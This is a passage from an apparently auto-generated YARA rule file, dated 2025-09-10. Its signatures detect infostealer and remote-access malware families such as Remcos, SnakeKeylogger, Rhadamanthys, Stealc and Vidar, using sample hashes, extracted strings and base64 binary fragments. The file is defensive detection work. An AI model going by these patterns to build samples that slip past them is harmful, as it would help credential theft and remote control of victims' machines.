      $s15 = "32wkCN8sJNjC3sGDxBDrAt8o3wQk2cFO2fjfHCTc+YoEJAQwPDpyAgQHiAbZwdjTm9/gnnPh2WwkAoPEBN3D3cLdwd3AWSnxKcp2ECnWsDAB0esDiAQySnX6iAbDkFWL" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__fb51ffcf_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_100 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fb51ffcf.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_10f246e9.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_82fb3f98.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_944c9457.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f67354f2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fb51ffcffd134849ebc6114eacc45a0bd9f2430188fd33064217df5b4cd41508"
      hash2 = "10f246e9a23f84a9e80787e654d3f5612eaded3b992ccaa7a92a94ce8676e40f"
      hash3 = "82fb3f98f9a5a3c050c3027605199400a80c204611173131096006bb8ff7204d"
      hash4 = "944c94577ed913dad804faa6e0a51c10ec26780e63b8852c92c64f23919a4848"
      hash5 = "f67354f208b9b7ea9e45262b27221c5862c73503d92139051a88c0479fc04cda"
   strings:
      $s1 = " Windows Forms Password Generator" fullword ascii /* score: '12.00'*/
      $s2 = "passwordGenerator" fullword ascii /* score: '12.00'*/
      $s3 = "PasswordStrength" fullword ascii /* score: '12.00'*/
      $s4 = "<IsPasswordValid>b__12_3" fullword ascii /* score: '12.00'*/
      $s5 = "<IsPasswordValid>b__12_0" fullword ascii /* score: '12.00'*/
      $s6 = "<IsPasswordValid>b__12_1" fullword ascii /* score: '12.00'*/
      $s7 = "<IsPasswordValid>b__12_2" fullword ascii /* score: '12.00'*/
      $s8 = "GenerateSecurePassword" fullword ascii /* score: '12.00'*/
      $s9 = "Windows Forms Password Generator" fullword wide /* score: '12.00'*/
      $s10 = "PassGenerator.Forms" fullword ascii /* score: '10.00'*/
      $s11 = "PassGenerator.Properties" fullword ascii /* score: '10.00'*/
      $s12 = "PassGenerator.Properties.Resources" fullword wide /* score: '10.00'*/
      $s13 = "get_ExcludeSimilar" fullword ascii /* score: '9.00'*/
      $s14 = "get_ExcludeAmbiguous" fullword ascii /* score: '9.00'*/
      $s15 = "get_UseCustomCharacters" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_101 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash4 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash5 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash6 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash7 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "System.Collections.Generic.IEnumerable<System.Reflection.Runtime.MethodInfos.RuntimeConstructorInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s2 = "System.Collections.Generic.IEnumerator<System.Reflection.FieldInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s3 = "System.Collections.Generic.IEnumerable<System.Reflection.FieldInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s4 = "Zget_RuntimeMethodCommonOfUninstantiatedMethod@" fullword ascii /* score: '15.00'*/
      $s5 = "System.Collections.Generic.IEnumerator<System.Reflection.Runtime.MethodInfos.RuntimeConstructorInfo>.get_Current@" fullword ascii /* score: '15.00'*/
      $s6 = "System.Collections.Generic.IEnumerable<System.Reflection.ConstructorInfo>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s7 = "XGetRuntimeGenericParameterTypeInfoForMethods" fullword ascii /* score: '12.00'*/
      $s8 = "get_Reader@" fullword ascii /* score: '12.00'*/
      $s9 = "IsSystemArrayZHasExplicitOrImplicitPublicDefaultConstructorTNormalizedPrimitiveTypeSizeForIntegerTypes" fullword ascii /* score: '10.00'*/
      $s10 = "BCreateChangeTypeArgumentException" fullword ascii /* score: '9.00'*/
      $s11 = "8get_QualifiedMethodSignature@" fullword ascii /* score: '9.00'*/
      $s12 = "get_MemberType@" fullword ascii /* score: '9.00'*/
      $s13 = "0ConvertPointerIfPossible2CreateChangeTypeException" fullword ascii /* score: '9.00'*/
      $s14 = "jget_TypeRefDefOrSpecsForDirectlyImplementedInterfaces@" fullword ascii /* score: '9.00'*/
      $s15 = "get_Suffix@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219__102 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash3 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash4 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash5 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash6 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash7 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash8 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash9 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash10 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash11 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
      hash12 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
      hash13 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash14 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash15 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash16 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash17 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash18 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash19 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "sync.runtime_SemacquireMutex" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.getLoadLibraryEx" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.getLoadLibrary" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.getGetProcAddress" fullword ascii /* score: '14.00'*/
      $s5 = "runtime.handlecompletion" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.hashGrow" fullword ascii /* score: '13.00'*/
      $s7 = "runtime.tophash" fullword ascii /* score: '13.00'*/
      $s8 = "tophash" fullword ascii /* score: '11.00'*/
      $s9 = "runtime.tracefree" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.bucketShift" fullword ascii /* score: '10.00'*/
      $s11 = "sync.runtime_nanotime" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.overLoadFactor" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.(*bmap).keys" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.growWork_fast32" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.evacuate_fast32" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__d5834be2544a02797750dc7759c325d4_imphash__SnakeKeylogger_signature__e1286f2989f2b70b354fe5e33036a7b_103 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash2 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
   strings:
      $s1 = "Thread.AbandonedMutexException" fullword ascii /* score: '21.00'*/
      $s2 = "2RefreshCurrentProcessorId2ProcessorNumberSpeedCheck*UninlinedThreadStatic8CreateThreadLocalCountObject$get_SafeWaitHandle@" fullword ascii /* score: '16.00'*/
      $s3 = " TerminateProcess" fullword ascii /* score: '15.00'*/
      $s4 = "ExecutionEngineException previously indicated an unspecified fatal error in the runtime. The runtime no longer raises this excep" ascii /* score: '15.00'*/
      $s5 = "ModuleFixupCell&SECURITY_ATTRIBUTES PROCESSOR_NUMBER" fullword ascii /* score: '15.00'*/
      $s6 = "*System.ComponentModel" fullword ascii /* score: '14.00'*/
      $s7 = "get_Current$GetCurrentThreadId" fullword ascii /* score: '12.00'*/
      $s8 = "GetNativeOffset6InitializeForIpAddressArray@" fullword ascii /* score: '12.00'*/
      $s9 = "<GetInlinedThreadStaticBaseSlowFGetUninlinedThreadStaticBaseForType" fullword ascii /* score: '12.00'*/
      $s10 = "2<get_ComputerName>b__10_0@" fullword ascii /* score: '12.00'*/
      $s11 = "IKeyedItem`1" fullword ascii /* score: '12.00'*/
      $s12 = "4NullableEqualityComparer`10ObjectEqualityComparer`1>IInternalStringEqualityComparer(KeyNotFoundException" fullword ascii /* score: '10.00'*/
      $s13 = "StorePermission0StorePermissionAttribute(StorePermissionFlags0TypeDescriptorPermissionBTypeDescriptorPermissionAttribute:TypeDes" ascii /* score: '10.00'*/
      $s14 = "$get_CurrentCulture(get_InvariantCulture" fullword ascii /* score: '9.00'*/
      $s15 = "*GetArrayDataReference=" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphas_104 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9f5e1c5e.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_aa1badc8.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0003037c.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8317cc0a.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_898fa5e7.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a44128af.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c043bb7c.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ff0c0b76.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cc1b38c4aa79c03c777b0d99c9ae67fef380572e36f0744d110c18137ce9f3dd"
      hash2 = "9f5e1c5ea05a6275d90bac217e0fd8061c7e87e174b69bcdd26625e873c7579b"
      hash3 = "aa1badc8a65a7e941f3e9e9ed3e7ab9ff565900904e57bcd8e5428c6b900d522"
      hash4 = "0003037c7818733557d04c87095ece05f43dce9f2b571d82ba633181956132a2"
      hash5 = "8317cc0a4d4b4c3776f6f572da2635063a6244f1d9846c8fa8754ab085c555c5"
      hash6 = "898fa5e7ec65acee299dca750e5369836bd3453aad9e7d5fe5e6061ee24e35d3"
      hash7 = "a44128afda43c52008225dda2f60357b13030df3f639e42cd83c3e35e0e8c09a"
      hash8 = "c043bb7c8433a8430e1856c399feaea58789b16961d4127d0aa2e72103cd3bbf"
      hash9 = "ff0c0b76e51dde557fbd22c925ee73d871159b84295843237fab8daae91afa85"
   strings:
      $s1 = "UpdateLastLogin" fullword ascii /* score: '15.00'*/
      $s2 = "<LastLoginDate>k__BackingField" fullword ascii /* score: '15.00'*/
      $s3 = "get_EstimatedHours" fullword ascii /* score: '9.00'*/
      $s4 = "get_Assignment" fullword ascii /* score: '9.00'*/
      $s5 = "GetUrgencyLevel" fullword ascii /* score: '9.00'*/
      $s6 = "get_SubjectGrades" fullword ascii /* score: '9.00'*/
      $s7 = "GetSubjectsNeedingImprovement" fullword ascii /* score: '9.00'*/
      $s8 = "GetGradeForSubject" fullword ascii /* score: '9.00'*/
      $s9 = "GetDaysUntilDue" fullword ascii /* score: '9.00'*/
      $s10 = "get_StudyHoursPerWeek" fullword ascii /* score: '9.00'*/
      $s11 = "get_StudentId" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__5a23efc3_RemcosRAT_signature__7f46e341_RemcosRAT_signature__a8741f2d_105 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_5a23efc3.js, RemcosRAT(signature)_7f46e341.js, RemcosRAT(signature)_a8741f2d.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5a23efc306dd589c16d9781de2b9d26eeeddccfca23310247912edc3323fa979"
      hash2 = "7f46e341e906e3c3b4b9ce3748f426f27fd808d904a1fe2a0706c690e0613132"
      hash3 = "a8741f2d62f81c47812fd549d14aea8d5872afb9b9788d69c6f14d5bf6fc74ac"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                           ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '                  ' */ /* score: '16.50'*/
      $s3 = "AEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string ' @                             ' */ /* score: '16.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                       ' */ /* score: '16.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE" ascii /* base64 encoded string '                         ' */ /* score: '16.50'*/
      $s6 = "ZXhwZWN0ZWQgc21hbGwgYmxvY2sgbGVha3MgYXJlOg0KACBieXRlczogAAAAAFVua25vd24AU3RyaW5nAABUaGUgc2l6ZXMgb2YgdW5leHBlY3RlZCBsZWFrZWQgbWVk" ascii /* score: '16.00'*/
      $s7 = "CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string '                             ' */ /* score: '14.50'*/
      $s8 = "ACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                               ' */ /* score: '12.50'*/
      $s9 = "dGlvbiCpIDIwMDQsIDIwMDUgUGllcnJlIGxlIFJpY2hlIC8gUHJvZmVzc2lvbmFsIFNvZnR3YXJlIERldmVsb3BtZW50APAPsBHDjUAAiwiJCotIBItACIlKBIlCCMON" ascii /* score: '11.00'*/
      $s10 = "ehjfehDfegjfOsONQADfKN9oCN9oEN9oGN9oIItIKIlKKN96IN96GN96EN96CN86w5DfKN9oCN9oEN9oGN9oIN9oKItIMIlKMN96KN96IN96GN96EN96CN86w41AAN8o" ascii /* score: '11.00'*/
      $s11 = "B40Eko0UkoP5AYPf/8HoFoHi//8/AAnBg8gwiAeNBJKNFJKD+QGD3//B6BWB4v//HwAJwYPIMIgHjQSSg/kBg9//wegUg8gwiAeNRwFfw41AAFNWi/GL2ovTi87oEQwA" ascii /* score: '11.00'*/
      $s12 = "AHQLVYvD6Cv+//9Z60OBvfhH/v8AEAAAfTeD5vCD7gSJtexH/v+Lw+ix/f//hMB1IMaF/0f+/wCLhfhH/v+LlexH/v+JlIXYB/7//4X4R/7/i8PoHvr//4vYhdt1jot/" ascii /* score: '11.00'*/
      $s13 = "/4vYT4PuCIP//w+F6f7//4uF5Ef+/4mF6Ef+/4GF2Ef+/wAIAACDhdxH/v8g/43wR/7/D4Wa/v//g734R/7/AH56gL33R/7/AHQQxgMNQ8YDCkPGAw1DxgMKQ7jYKUAA" ascii /* score: '11.00'*/
      $s14 = "3zrDjUAAg+kMAcgByvfZeRPfLAHfbAEI33wRCN88EYPBEHjt3ywB3zwRi0QBCIlEEQjDjUAAg+kEAcgByvfZ3ywB3zwRg8EIePWLBAGJBBHDkItIBIsQOdGJEYlKBHQC" ascii /* score: '11.00'*/
      $s15 = "uTwAAACL0+iG+f//i9iLvfhH/v9Phf9yQ0fHheBH/v8AAAAAjbXYB/7/g73gR/7/AHQIxgMsQ8YDIEOLBovT6DL4//+L2I2F1//9/zvYdwz/heBH/v+DxgRPdc64GCpA" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043__106 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash3 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash4 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash5 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash6 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
      hash7 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.levelLogPages" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.sysDirectory" fullword ascii /* score: '14.00'*/
      $s3 = "runtime.sysDirectoryLen" fullword ascii /* score: '14.00'*/
      $s4 = "runtime.cbs" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.shiftError" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.boundsNegErrorFmts" fullword ascii /* score: '13.00'*/
      $s7 = "runtime.boundsErrorFmts" fullword ascii /* score: '13.00'*/
      $s8 = "runtime.inittrace" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.gcMarkDoneFlushed" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.gcsema" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.suspendLock" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.gcBgMarkWorkerCount" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.levelShift" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.levelBits" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.physHugePageShift" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__7bfcbc53d4c02bdedbc3a63219e5ed9f_imphash__Rhadamanthys_signature__d5834be2544a02797750dc7759c325d4__107 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash2 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash3 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
   strings:
      $s1 = "TElementFReflectionDomainSetupImplementationDExecutionEnvironmentImplementation[" fullword ascii /* score: '16.00'*/
      $s2 = "RTryGetConstructedGenericTypeForComponentsRTryLookupFunctionPointerTypeForComponents@" fullword ascii /* score: '15.00'*/
      $s3 = "8TryGetByRefTypeForTargetType,GetByRefTypeTargetType" fullword ascii /* score: '14.00'*/
      $s4 = "6get_IsArrayOfReferenceTypes:TryGetGenericMethodComponents" fullword ascii /* score: '12.00'*/
      $s5 = "Nget_InternalRuntimeGenericTypeArguments@" fullword ascii /* score: '12.00'*/
      $s6 = "2FunctionPointersToOffsetstTryGetConstructedGenericTypeForComponentsNoConstraintCheck@" fullword ascii /* score: '12.00'*/
      $s7 = "PGetMethodNameFromStartAddressIfAvailable FormatMethodName" fullword ascii /* score: '12.00'*/
      $s8 = "Set8get_IsVectorizationSupported@" fullword ascii /* score: '12.00'*/
      $s9 = "IsValueTypeImpl<get_InternalRuntimeElementType@" fullword ascii /* score: '12.00'*/
      $s10 = "@get_RuntimeGenericTypeParameters>get_TypeRefDefOrSpecForBaseType@" fullword ascii /* score: '12.00'*/
      $s11 = "`ReflectionExecutionDomainCallbacksImplementation" fullword ascii /* score: '12.00'*/
      $s12 = "$GetRuntimeTypeCode" fullword ascii /* score: '12.00'*/
      $s13 = "$CoGetApartmentType" fullword ascii /* score: '9.00'*/
      $s14 = "Arabic*TransliteratedEnglish(TransliteratedFrench CompareEraRanges" fullword ascii /* score: '9.00'*/
      $s15 = "get_IsGCPointer$get_UnderlyingType0get_HasStaticConstructor" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__32cfff30_Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c_108 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash2 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash3 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
   strings:
      $s1 = "runtime._GetQueuedCompletionStatusEx" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.support_sse41" fullword ascii /* score: '13.00'*/
      $s3 = "runtime.statictmp_2" fullword ascii /* score: '13.00'*/
      $s4 = "runtime.support_popcnt" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.statictmp_10" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.statictmp_8" fullword ascii /* score: '13.00'*/
      $s7 = "runtime.statictmp_1" fullword ascii /* score: '13.00'*/
      $s8 = "runtime.statictmp_16" fullword ascii /* score: '13.00'*/
      $s9 = "runtime.statictmp_11" fullword ascii /* score: '13.00'*/
      $s10 = "runtime.statictmp_20" fullword ascii /* score: '13.00'*/
      $s11 = "runtime.statictmp_9" fullword ascii /* score: '13.00'*/
      $s12 = "runtime.statictmp_17" fullword ascii /* score: '13.00'*/
      $s13 = "runtime.statictmp_5" fullword ascii /* score: '13.00'*/
      $s14 = "runtime.support_erms" fullword ascii /* score: '13.00'*/
      $s15 = "runtime.support_sse2" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043_imphash__Sliver_signature__c2d457ad8ac36fc9f18d45bffcd450c2_imphas_109 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash2 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash3 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash4 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash5 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
